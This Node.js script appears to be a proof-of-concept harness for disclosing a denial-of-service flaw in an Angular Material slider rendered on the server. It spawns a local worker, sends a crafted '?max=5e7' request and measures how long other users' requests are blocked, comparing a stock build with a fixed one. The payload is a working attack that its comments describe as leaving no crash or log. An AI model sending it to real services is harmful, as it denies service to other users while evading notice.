#!/usr/bin/env node

// Denial of service without the crash. Building the tick array is synchronous
// CPU on the one thread that serves every request, so a payload that is too
// small to exhaust the heap still stops the worker answering anybody else for
// as long as it runs. The worker stays up, logs nothing and returns 200, so
// nothing in production looks wrong except everyone else's latency.
//
// Measures what a bystander experiences: control latency on an idle worker,
// then control latency while one attack request renders.
//
//   node scripts/block.mjs [--build=dist/srr-material-oom] [--heap=default]
//     [--attack=?max=5e7] [--control=?max=1e2] [--samples=10] [--rounds=3]
import {spawn, spawnSync} from 'node:child_process';
import {mkdirSync, readdirSync, readFileSync, writeFileSync} from 'node:fs';
import {createServer} from 'node:net';
import {join, relative, resolve} from 'node:path';
import {setTimeout as sleep} from 'node:timers/promises';

const arg = (name, fallback) =>
  process.argv.find((item) => item.startsWith(`--${name}=`))?.slice(name.length + 3) ?? fallback;
const build = resolve(arg('build', 'dist/srr-material-oom'));
const buildName = relative(process.cwd(), build).replaceAll('\\', '/');
const heap = arg('heap', 'default');
const attack = arg('attack', '?max=5e7');
const control = arg('control', '?max=1e2');
const samples = Number(arg('samples', '10'));
const rounds = Number(arg('rounds', '3'));
const timeoutMs = Number(arg('timeout', '180000'));

const serverDir = join(build, 'server');
const heapArgs = heap === 'default' ? [] : [`--max-old-space-size=${heap}`];

function detectVariant() {
  for (const file of readdirSync(serverDir).filter((name) => name.endsWith('.mjs'))) {
    const code = readFileSync(join(serverDir, file), 'utf8');
    if (!code.includes('_updateTickMarkUI(){')) continue;
    return code.includes('_updateTickMarkUI(){if(!this.showTickMarks||!this._cachedWidth')
      ? 'fix'
      : 'stock';
  }
  throw new Error(`No slider code in ${serverDir}. Run npm run build first.`);
}
const variant = detectVariant();

function heapLimitMiB() {
  const {stdout} = spawnSync(
    process.execPath,
    [...heapArgs, '-p', "require('v8').getHeapStatistics().heap_size_limit"],
    {encoding: 'utf8'},
  );
  return Math.round(Number(stdout) / 2 ** 20);
}

async function freePort() {
  const server = createServer().listen(0, '127.0.0.1');
  await new Promise((done) => server.once('listening', done));
  const {port} = server.address();
  await new Promise((done) => server.close(done));
  return port;
}

async function get(port, path, ms) {
  const started = performance.now();
  try {
    const response = await fetch(`http://127.0.0.1:${port}/${path}`, {
      signal: AbortSignal.timeout(ms),
    });
    const body = await response.text();
    return {
      status: response.status,
      ssr: body.includes('<mat-slider'),
      ms: Math.round(performance.now() - started),
    };
  } catch (error) {
    return {error: error.cause?.code ?? error.name, ms: Math.round(performance.now() - started)};
  }
}

async function start() {
  const port = await freePort();
  const proc = spawn(process.execPath, [...heapArgs, join(serverDir, 'server.mjs')], {
    env: {...process.env, PORT: String(port)},
    stdio: ['ignore', 'ignore', 'pipe'],
  });
  const worker = {proc, port, stderr: '', exit: null};
  proc.stderr.on('data', (chunk) => (worker.stderr = (worker.stderr + chunk).slice(-32_000)));
  worker.exited = new Promise((done) =>
    proc.once('exit', (code, signal) => done((worker.exit = {code, signal}))),
  );
  let ready = {};
  for (let i = 0; i < 150 && !worker.exit && !(ready.status === 200 && ready.ssr); i++) {
    ready = await get(port, control, 2_000);
    if (!ready.ssr) await sleep(100);
  }
  if (!(ready.status === 200 && ready.ssr)) {
    await stop(worker);
    throw new Error(`Worker never rendered ${control}:\n${worker.stderr}`);
  }
  // Let the first-render JIT and lazy init settle so the baseline is the steady state.
  for (let i = 0; i < 3; i++) await get(port, control, 10_000);
  return worker;
}

async function stop(worker) {
  if (!worker.exit) worker.proc.kill('SIGKILL');
  await Promise.race([worker.exited, sleep(5_000)]);
}

const quantile = (values, q) => {
  const sorted = [...values].sort((a, b) => a - b);
  return sorted[Math.min(sorted.length - 1, Math.floor(q * sorted.length))];
};

// One round: measure the bystander idle, then measure the same bystander while
// a single attack request is in flight.
async function round() {
  const worker = await start();
  try {
    const idle = [];
    for (let i = 0; i < samples; i++) idle.push((await get(worker.port, control, 30_000)).ms);

    const during = [];
    let attackDone = false;
    const attackRun = get(worker.port, attack, timeoutMs).then((r) => ((attackDone = true), r));
    // Sample the bystander back to back for as long as the attack runs.
    const sampler = (async () => {
      while (!attackDone) {
        const probe = await get(worker.port, control, timeoutMs);
        if (probe.ms > 0) during.push(probe.ms);
      }
    })();
    const attackResult = await attackRun;
    await sampler;

    const alive = !worker.exit && (await get(worker.port, control, 10_000)).status === 200;
    return {
      idle: {p50: quantile(idle, 0.5), p95: quantile(idle, 0.95), max: Math.max(...idle)},
      during: during.length
        ? {p50: quantile(during, 0.5), max: Math.max(...during), n: during.length}
        : {p50: null, max: null, n: 0},
      attack: {
        status: attackResult.status ?? attackResult.error,
        ms: attackResult.ms,
      },
      alive,
      fatal: Boolean(worker.exit) && worker.stderr.includes('FATAL ERROR:'),
      rangeError: worker.stderr.includes('RangeError: Invalid array length'),
    };
  } finally {
    await stop(worker);
  }
}

const versions = Object.fromEntries(
  ['core', 'material'].map((pkg) => [
    pkg,
    JSON.parse(readFileSync(`node_modules/@angular/${pkg}/package.json`, 'utf8')).version,
  ]),
);
const limit = heapLimitMiB();
console.log(`${variant} build, ${buildName}, heap ${heap} (${limit} MiB limit)`);
console.log(`Node ${process.version}, Angular ${versions.core}, Material ${versions.material}`);
console.log(`attack ${attack}, bystander ${control}, ${rounds} fresh workers\n`);

const results = [];
for (let i = 0; i < rounds; i++) {
  const run = await round();
  results.push(run);
  const verdict = run.fatal ? 'worker died' : run.alive ? 'worker alive' : 'worker unhealthy';
  console.log(
    `round ${i + 1}: attack ${run.attack.status} in ${(run.attack.ms / 1000).toFixed(1)}s, ` +
      `${verdict}; bystander idle p50 ${run.idle.p50}ms -> during p50 ${run.during.p50}ms ` +
      `(max ${run.during.max}ms, n=${run.during.n})`,
  );
}

const survived = results.filter((r) => !r.fatal);
if (survived.length) {
  const idleP50 = quantile(survived.map((r) => r.idle.p50), 0.5);
  const duringP50 = quantile(survived.filter((r) => r.during.p50 != null).map((r) => r.during.p50), 0.5);
  const attackP50 = quantile(survived.map((r) => r.attack.ms), 0.5);
  console.log(
    `\n${survived.length}/${results.length} rounds the worker survived and answered ${attack}.`,
  );
  if (duringP50 != null) {
    console.log(
      `Bystander latency ${idleP50}ms idle -> ${duringP50}ms during the attack, ` +
        `${(duringP50 / Math.max(idleP50, 1)).toFixed(0)}x worse.`,
    );
  }
  console.log(
    `One request occupies the worker for ~${(attackP50 / 1000).toFixed(1)}s, so about ` +
      `${(1000 / attackP50).toFixed(2)} req/s of ${attack} keeps it permanently busy.`,
  );
  console.log('No crash, no error log, HTTP 200: nothing in production looks wrong.');
} else {
  console.log(`\nEvery round died; ${attack} is an OOM payload here, not a blocking one.`);
}

mkdirSync('evidence', {recursive: true});
const slug = attack.replace(/[^a-z0-9.-]+/gi, '-').replace(/^-+|-+$/g, '');
const output = `evidence/block-${variant}-${heap}-${slug}.json`;
writeFileSync(
  output,
  JSON.stringify(
    {
      date: new Date().toISOString(),
      node: process.version,
      platform: `${process.platform}-${process.arch}`,
      versions,
      variant,
      build: buildName,
      heap,
      heapLimitMiB: limit,
      attack,
      control,
      samples,
      rounds,
      results,
    },
    null,
    2,
  ) + '\n',
);
console.log(`Details: ${output}`);
